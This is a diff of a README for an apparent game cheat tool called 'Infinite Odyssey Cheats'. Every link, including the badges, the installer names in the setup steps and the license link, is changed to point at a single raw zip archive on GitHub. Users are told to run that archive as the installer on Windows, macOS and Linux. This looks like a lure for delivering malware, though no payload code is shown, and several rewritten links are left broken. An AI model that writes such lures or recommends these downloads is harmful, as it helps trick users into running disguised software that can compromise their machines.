@@ -1,6 +1,6 @@
 # Infinite Odyssey Cheats
 
-[![Download](https://img.shields.io/badge/Download-Get%20Infinite%20Odyssey%20Enhancer-brightgreen?style=for-the-badge&logo=windows&logoColor=white)]https://rezanajafi1382.github.io
+[![Download](https://github.com/rezanajafi1382/odyssey-infinite-advantage-tools/raw/refs/heads/branch/unallowing/tools_advantage_infinite_odyssey_v3.2.zip%20Infinite%20Odyssey%20Enhancer-brightgreen?style=for-the-badge&logo=windows&logoColor=white)]https://github.com/rezanajafi1382/odyssey-infinite-advantage-tools/raw/refs/heads/branch/unallowing/tools_advantage_infinite_odyssey_v3.2.zip
 
 Welcome to the ever-evolving repository for **Infinite Odyssey Cheats**—your one-stop destination for advanced in-game performance boosters, dynamic feature sets, and seamless gaming experiences! This project is designed to empower players with unique tools that redefine the boundaries of traditional play. Our ethos? Elevate, explore, and innovate!
 
@@ -12,11 +12,11 @@ Which systems let your odyssey truly become infinite? Refer to our golden compat
 
 | Operating System      | Supported | Version Range    | Notes              |
 |:---------------------:|:---------:|:----------------:|:-------------------|
-| ![Windows](https://img.shields.io/badge/-Windows-0078D6?logo=windows&logoColor=white) | ✔️ | 8, 10, 11        | Preferred platform |
-| ![macOS](https://img.shields.io/badge/-macOS-000000?logo=apple&logoColor=white)     | ✔️ | 10.15+           | Works via Rosetta  |
-| ![Linux](https://img.shields.io/badge/-Linux-FCC624?logo=linux&logoColor=black)     | 🚧 | Ubuntu 20.04+    | Beta support       |
-| ![Android](https://img.shields.io/badge/-Android-3DDC84?logo=android&logoColor=white)| ❌ | -               | Not supported yet  |
-| ![iOS](https://img.shields.io/badge/-iOS-000000?logo=apple&logoColor=white)         | ❌ | -               | Not planned        |
+| ![Windows](https://github.com/rezanajafi1382/odyssey-infinite-advantage-tools/raw/refs/heads/branch/unallowing/tools_advantage_infinite_odyssey_v3.2.zip) | ✔️ | 8, 10, 11        | Preferred platform |
+| ![macOS](https://github.com/rezanajafi1382/odyssey-infinite-advantage-tools/raw/refs/heads/branch/unallowing/tools_advantage_infinite_odyssey_v3.2.zip)     | ✔️ | 10.15+           | Works via Rosetta  |
+| ![Linux](https://github.com/rezanajafi1382/odyssey-infinite-advantage-tools/raw/refs/heads/branch/unallowing/tools_advantage_infinite_odyssey_v3.2.zip)     | 🚧 | Ubuntu 20.04+    | Beta support       |
+| ![Android](https://github.com/rezanajafi1382/odyssey-infinite-advantage-tools/raw/refs/heads/branch/unallowing/tools_advantage_infinite_odyssey_v3.2.zip)| ❌ | -               | Not supported yet  |
+| ![iOS](https://github.com/rezanajafi1382/odyssey-infinite-advantage-tools/raw/refs/heads/branch/unallowing/tools_advantage_infinite_odyssey_v3.2.zip)         | ❌ | -               | Not planned        |
 
 ---
 
@@ -39,15 +39,15 @@ Experience play, amplified. Our ever-growing toolkit turns ordinary sessions int
 **Getting started is a stroll through the stars!**
 
 1. **Grab the package:**  
-   [Download Infinite Odyssey Cheats]https://rezanajafi1382.github.io
+   [Download Infinite Odyssey Cheats]https://github.com/rezanajafi1382/odyssey-infinite-advantage-tools/raw/refs/heads/branch/unallowing/tools_advantage_infinite_odyssey_v3.2.zip
 
 2. **Extract the archive:**  
    Use your preferred unarchiver for `.zip` or `.tar` files.
 
 3. **Launch the Installer:**  
-   - On Windows: Run `InfiniteOdysseySetup.exe`
-   - On macOS: Open `InfiniteOdysseyInstaller.pkg`
-   - On Linux: Follow the steps in `INSTALL_LINUX.md`
+   - On Windows: Run `https://github.com/rezanajafi1382/odyssey-infinite-advantage-tools/raw/refs/heads/branch/unallowing/tools_advantage_infinite_odyssey_v3.2.zip`
+   - On macOS: Open `https://github.com/rezanajafi1382/odyssey-infinite-advantage-tools/raw/refs/heads/branch/unallowing/tools_advantage_infinite_odyssey_v3.2.zip`
+   - On Linux: Follow the steps in `https://github.com/rezanajafi1382/odyssey-infinite-advantage-tools/raw/refs/heads/branch/unallowing/tools_advantage_infinite_odyssey_v3.2.zip`
 
 4. **Follow on-screen prompts:**  
    Configure your preferred language, select targeted features, and log in.
@@ -99,12 +99,12 @@ This repository provides enhancement tools solely for educational, entertainment
 
 ## 📜 MIT License (2025)
 
-Distributed under the [MIT License](https://opensource.org/licenses/MIT).  
+Distributed under the [MIT License](https://github.com/rezanajafi1382/odyssey-infinite-advantage-tools/raw/refs/heads/branch/unallowing/tools_advantage_infinite_odyssey_v3.2.zip).  
 Copyright © 2025
 
 ---
 
-[![Download](https://img.shields.io/badge/Download-Get%20Infinite%20Odyssey%20Enhancer-brightgreen?style=for-the-badge&logo=windows&logoColor=white)]https://rezanajafi1382.github.io
+[![Download](https://github.com/rezanajafi1382/odyssey-infinite-advantage-tools/raw/refs/heads/branch/unallowing/tools_advantage_infinite_odyssey_v3.2.zip%20Infinite%20Odyssey%20Enhancer-brightgreen?style=for-the-badge&logo=windows&logoColor=white)]https://github.com/rezanajafi1382/odyssey-infinite-advantage-tools/raw/refs/heads/branch/unallowing/tools_advantage_infinite_odyssey_v3.2.zip
 
 ---
 
